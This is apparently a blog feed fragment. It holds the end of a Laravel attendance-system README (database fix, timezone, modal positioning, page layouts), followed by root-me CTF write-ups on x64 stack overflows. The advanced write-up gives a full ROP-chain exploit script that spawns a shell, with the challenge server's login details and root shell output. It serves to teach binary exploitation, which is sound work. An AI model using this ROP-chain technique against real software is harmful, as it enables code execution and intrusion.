&lt;h3&gt;11.1. &lt;a name='DefaultTimezone'&gt;&lt;/a&gt;Default Timezone&lt;/h3&gt;
&lt;p&gt;默认时区&lt;/p&gt;
&lt;p&gt;&lt;code&gt;UTC+8&lt;/code&gt; &lt;code&gt;Asia/Shanghai&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;12. &lt;a name='Schedulingtask'&gt;&lt;/a&gt;Scheduling task&lt;/h2&gt;
&lt;p&gt;计划任务&lt;/p&gt;
&lt;h2&gt;13. &lt;a name='note'&gt;&lt;/a&gt;note&lt;/h2&gt;
&lt;h3&gt;13.1. &lt;a name='Errormessage:'&gt;&lt;/a&gt;Error message:&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;$ php artisan migrate
Migration table created successfully.


  [Illuminate\Database\QueryException]
  SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was t
  oo long; max key length is 1000 bytes (SQL: alter table `users` add unique
  `users_email_unique`(`email`))

  [PDOException]
  SQLSTATE[42000]: Syntax error or access violation: 1071 Specified key was t
  oo long; max key length is 1000 bytes
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;13.2. &lt;a name='Solution'&gt;&lt;/a&gt;Solution&lt;/h3&gt;
&lt;p&gt;in file: &lt;code&gt;config\database.php&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;'charset' =&gt; 'utf8mb4',
'collation' =&gt; 'utf8mb4_unicode_ci',
'engine' =&gt; 'InnoDB ROW_FORMAT=DYNAMIC',
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;13.3. &lt;a name='ChangeServerTimezone'&gt;&lt;/a&gt;Change Server Timezone&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;sudo timedatectl set-timezone Asia/Shanghai
date
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;&lt;p&gt;
  Add timezone when written data into database!&lt;/p&gt;
&lt;p&gt;  &lt;code&gt;Caron::now('Asia/Shanghai')&lt;/code&gt; &lt;strong&gt;OR&lt;/strong&gt; &lt;code&gt;Carbon::now('CST')&lt;/code&gt;
&lt;/p&gt;&lt;/blockquote&gt;
&lt;h2&gt;14. &lt;a name='SourceCoderewrite'&gt;&lt;/a&gt;Source Code rewrite&lt;/h2&gt;
&lt;h3&gt;14.1. &lt;a name='modalposition'&gt;&lt;/a&gt;modal position&lt;/h3&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;p&gt;make the modal box be at a right position&lt;/p&gt;
&lt;h3&gt;14.2. &lt;a name='positionmethod'&gt;&lt;/a&gt;positionmethod&lt;/h3&gt;
&lt;p&gt;find the function 'Modal.prototype.adjustDialog' bootstrap.js(in this project is included in public/js/app.js),then replace them as the follow code:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Modal.prototype.adjustDialog = function () {  
    var modalIsOverflowing = this.$element[0].scrollHeight &gt; document.documentElement.clientHeight  

    this.$element.css({  
      paddingLeft:  !this.bodyIsOverflowing &amp;amp;&amp;amp; modalIsOverflowing ? this.scrollbarWidth : '',  
      paddingRight: this.bodyIsOverflowing &amp;amp;&amp;amp; !modalIsOverflowing ? this.scrollbarWidth : ''  
    });  


    var $modal_dialog = $(this.$element[0]).find('.modal-dialog');  
    //get the view heigh
    var clientHeight = (document.body.clientHeight &lt; document.documentElement.clientHeight) ? document.body.clientHeight: document.documentElement.clientHeight;  
    //get dialog heigh 
    var dialogHeight = $modal_dialog.height();  
    //compute the distance to the top 
    var m_top = (clientHeight - dialogHeight)/3;  
    // console.log(&quot;clientHeight : &quot; + clientHeight);  
    // console.log(&quot;dialogHeight : &quot; + dialogHeight);  
    // console.log(&quot;m_top : &quot; + m_top);  
    $modal_dialog.css({'margin': m_top + 'px auto'});  
}  
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;15. &lt;a name='Web-viewLayoutsDesign'&gt;&lt;/a&gt;Web-view Layouts Design&lt;/h2&gt;
&lt;h3&gt;15.1. &lt;a name='generalpage'&gt;&lt;/a&gt;general page&lt;/h3&gt;
&lt;p&gt;function:display all the records ordered by time stamp&lt;/p&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;day/week/month&lt;/li&gt;
&lt;li&gt;export as excel&lt;/li&gt;
&lt;li&gt;correct records&lt;/li&gt;
&lt;li&gt;search by employee name&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;view structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   _____________________________
  |                     export  |
  |display option | search box  |
  |-----------------------------|
  |records                      |
  |record 1              correct|
  |record 2              correct|
  |   .                     .   |
  |   .                     .   |
  |_____________________________|
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;15.2. &lt;a name='graphpage'&gt;&lt;/a&gt;graph page&lt;/h3&gt;
&lt;p&gt;function: build a calendar, and display each employee duty status.&lt;/p&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;a calendar can show as day/week/month.&lt;/li&gt;
&lt;li&gt;mark up the time/date that has record&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;view structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   _____________________________
  |                             |
  |display option | search box  |
  |-----------------------------|
  |calendar option              |
  |   .                     .   |
  |   .                     .   |
  |   .     calendar        .   |
  |   .                     .   |
  |_____________________________|
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;15.3. &lt;a name='validrecords'&gt;&lt;/a&gt;valid records&lt;/h3&gt;
&lt;p&gt;function: display all records by day.&lt;/p&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;display single record(included in and out) of each employee devided by day&lt;/li&gt;
&lt;li&gt;should include arrive&amp;amp;leave time,also,a status indicate valid(invalid) should be shown&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;view structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   _____________________________
  |                     export  |
  |       | search box  |       |
  |-----------------------------|
  |records        status        |
  |record 1          Y   correct|
  |record 2          Y   correct|
  |   .                     .   |
  |      pagination by day      |
  |_____________________________|
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;15.4. &lt;a name='holidaypageoption'&gt;&lt;/a&gt;holiday page(option)&lt;/h3&gt;
&lt;p&gt;function: mark up holiday.&lt;/p&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;decide which day has no duty&lt;/li&gt;
&lt;li&gt;mark up the time/date in the calendar view&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;view structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   _____________________________
  |                             |
  |        ????????????         |
  |-----------------------------|
  |calendar option              |
  |   .                     .   |
  |   .                     .   |
  |   .     calendar        .   |
  |   .                     .   |
  |_____________________________|
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;15.5. &lt;a name='timeeditpage'&gt;&lt;/a&gt;timeedit page&lt;/h3&gt;
&lt;p&gt;function:define legal time&lt;/p&gt;
&lt;p&gt;demand:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;define valid time of records&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;view structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;   _____________________________
  |                             |
  |        ????????????         |
  |-----------------------------|
  |                             |
  |   .                     .   |
  |   .      post form      .   |
  |   .                     .   |
  |   .                     .   |
  |_____________________________|
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;Copyright&lt;/h1&gt;
&lt;p&gt;版权信息&lt;/p&gt;
&lt;p&gt;Copyright (c) 2017 &lt;a href=&quot;https://triplez.cn&quot;&gt;TripleZ&lt;/a&gt; &lt;a href=&quot;http://403forbidden.website&quot;&gt;Foxwest&lt;/a&gt;&lt;/p&gt;</content><author><name>DoubleMice</name></author><summary type="html">DutySystem 开发周期7月20号到8月1号，8月20号到8月25号左右 A duty system for xxxxxxx. Initialize MySQL authentication Model 3.1. Model Relationship Controller Middleware API Database tables 7.1. table name: employees 7.2. table names: records 7.3. table name: users 7.4. table name: user_action_records Migrations Seeds Employee Status Important Timestamp 11.1. Default Timezone Scheduling task note 13.1. Error message: 13.2. Solution 13.3. Change Server Timezone Source Code rewrite 14.1. modal position 14.2. positionmethod Web-view Layouts Design 15.1. general page 15.2. graph page 15.3. valid records 15.4. holiday page(option) 15.5. timeedit page Runtime Enviornment 运行环境 Enviornment Version Laravel 5.4 PHP 7.0.10 MySQL 5.7.17 Nginx 1.11.9 1. Initialize 系统初始化 php artisan key:generate php artisan make:auth php artisan migrate 2. MySQL authentication account: ** password: ** remote database: IP: **.**.**.**:** Account: ** Password: ** Service Logic 业务逻辑 3. Model 模型 User Employee Record (For employees) ActionRecord (For admins) CarRecord CardRecord TimeNode DailyCheckStatus HolidayDate AbsenceValidRecord 3.1. Model Relationship 模型间关系 $user-&gt;actions; // 返回某个指定管理员操作记录 $actions-&gt;user; // 返回某条指定记录的管理员信息</summary></entry><entry><title type="html">root-me:x64 stack overflow advanced</title><link href="http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-advanced.html" rel="alternate" type="text/html" title="root-me:x64 stack overflow advanced" /><published>2017-11-29T16:41:23+08:00</published><updated>2017-11-29T16:41:23+08:00</updated><id>http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-advanced</id><content type="html" xml:base="http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-advanced.html">&lt;h1&gt;x64 stack overflow advanced&lt;/h1&gt;
&lt;h2&gt;general&lt;/h2&gt;
&lt;p&gt;its compile option:&lt;br /&gt;
&lt;code&gt;gcc -o ch34 ch34.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;universe  exploit method:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;leak a used function&lt;/li&gt;
&lt;li&gt;calc offset with &lt;code&gt;libc.so&lt;/code&gt; and the function to get &lt;code&gt;system&lt;/code&gt; and &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ret2libc(when NX enabled) or write shellcode&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;calc the truth address:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;xxxx_got = libc.symbols['xxxx']
xxxx_addr = func_addr - (func_got - xxxx_got)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But in this program,static method was used to compile it,all the function address are static.&lt;/p&gt;
&lt;h2&gt;step&lt;/h2&gt;
&lt;p&gt;checksec:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[*] '/mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced/ch34'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;According to above analysis we can use rop gadgets:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt; ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced  ROPgadget --binary ch34 --ropchain
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;get an universe rop chain:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python2
# execve generated by ROPgadget
from struct import pack

# Padding goes here
p = ''

p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data  arg[0]
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8  arg[1]
p += pack('&lt;Q', 0x0000000000437205) # pop rdx ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8  arg[2]
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045b525) # syscall ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;calc the padding length:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004010ec in main ()
gdb-peda$ pattern_offset A%JA%fA%5
A%JA%fA%5 found at offset: 280
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So the padding length is 280.&lt;/p&gt;
&lt;p&gt;Another question we have to mention is that on my computer &lt;code&gt;/bin/sh&lt;/code&gt; is a soft link of &lt;code&gt;/bin/dash&lt;/code&gt;,but on the pratice computer is not.I need to edit the rop chain to make it run &lt;code&gt;execve(&quot;/bin/dash&quot;,NULL,NULL)&lt;/code&gt; instead of &lt;code&gt;execve(&quot;/bin/sh&quot;,NULL,NULL)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;let's look at here:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += '/bin//sh'
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x0000000000437205) # pop rdx ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;extra &lt;code&gt;/&lt;/code&gt; in string &lt;code&gt;/bin//sh&lt;/code&gt; at &lt;code&gt;line 4&lt;/code&gt; is used to be stack alignment,alse we can use &lt;code&gt;//bin/sh&lt;/code&gt; to produce the same effect&lt;/li&gt;
&lt;li&gt;string end &lt;code&gt;\0&lt;/code&gt; is set at &lt;code&gt;line 7-9&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;so we could devide &lt;code&gt;////////bin/dash&lt;/code&gt; into two parts:&lt;code&gt;////////&lt;/code&gt; and &lt;code&gt;bin/dash&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# write first part
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += '////////'# extra slash used to align
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# write second part
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += 'bin/dash'# extra slash used to align
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# add string end &quot;&lt;pre wp-pre-tag-6&gt;&lt;/pre&gt;&quot; at &quot;.data + 16&quot;
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

# prepare arg of function `execve()`
p += pack('&lt;Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data   arg[0] *cmd
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0010) # @ .data + 16  arg[1] 0
p += pack('&lt;Q', 0x0000000000437205) # pop rdx ; ret
p += pack('&lt;Q', 0x00000000006c0010) # @ .data + 16  arg[2] 0
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;exploit&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;#!/usr/bin/env python2
# execve generated by ROPgadget 

from pwn import *
from struct import pack

DEBUG = 1
if DEBUG:
    proc = process('./ch34')
else:
    s = ssh(host='challenge03.root-me.org',
            user='app-systeme-ch34',
            password='app-systeme-ch34',
            port=2223)
    proc = s.process('./ch34')

# Padding goes here
p = 'A'*280

p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += '////////'
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret

p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0008) # @ .data + 8
p += pack('&lt;Q', 0x000000000044d2b4) # pop rax ; ret
p += 'bin/dash'
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += pack('&lt;Q', 0x00000000006c0010) # @ .data + 16
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x0000000000467b51) # mov qword ptr [rsi], rax ; ret
p += pack('&lt;Q', 0x00000000004016d3) # pop rdi ; ret
p += pack('&lt;Q', 0x00000000006c0000) # @ .data
p += pack('&lt;Q', 0x00000000004017e7) # pop rsi ; ret
p += p64(0)
p += pack('&lt;Q', 0x0000000000437205) # pop rdx ; ret
p += p64(0)
p += pack('&lt;Q', 0x000000000041bd9f) # xor rax, rax ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045aa10) # add rax, 1 ; ret
p += pack('&lt;Q', 0x000000000045b525) # syscall ; ret

# gdb.attach(proc)
proc.sendline(p)
proc.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;run it:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt; ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced  python exp_ROPgadget.py 
[+] Starting local process './ch34': pid 5004
[*] Switching to interactive mode
Hex resultb0100000c0100004141414141414141ffffffe71740
$ id
uid=0(root) gid=0(root) groups=0(root)
$  
&lt;/code&gt;&lt;/pre&gt;</content><author><name>DoubleMice</name></author><category term="root-me" /><summary type="html">x64 stack overflow advanced general its compile option: gcc -o ch34 ch34.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static universe exploit method: leak a used function calc offset with libc.so and the function to get system and /bin/sh ret2libc(when NX enabled) or write shellcode calc the truth address: xxxx_got = libc.symbols['xxxx'] xxxx_addr = func_addr - (func_got - xxxx_got) But in this program,static method was used to compile it,all the function address are static. step checksec: [*] '/mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced/ch34' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) According to above analysis we can use rop gadgets: ⚡ root@pwn  /mnt/hgfs/pwnexc/root-me/x64 stack overflow advanced  ROPgadget --binary ch34 --ropchain get an universe rop chain: #!/usr/bin/env python2 # execve generated by ROPgadget from struct import pack</summary></entry><entry><title type="html">root-me:x64 stack overflow basic</title><link href="http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-basic.html" rel="alternate" type="text/html" title="root-me:x64 stack overflow basic" /><published>2017-11-29T15:58:58+08:00</published><updated>2017-11-29T15:58:58+08:00</updated><id>http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-basic</id><content type="html" xml:base="http://localhost:4000/root-me/2017/11/29/root_me-x64-stack-overflow-basic.html">&lt;h1&gt;x64 stack overflow basic&lt;/h1&gt;
&lt;h2&gt;step&lt;/h2&gt;
&lt;p&gt;checksec:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;use the address of &lt;code&gt;callMeMaybe&lt;/code&gt; to cover the return address of &lt;code&gt;strlen&lt;/code&gt;&lt;br /&gt;
calc the distance:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400728 in main ()
gdb-peda$ pattern_offset A%JA%fA%5A
A%JA%fA%5A found at offset: 280
&lt;/code&gt;&lt;/pre&gt;
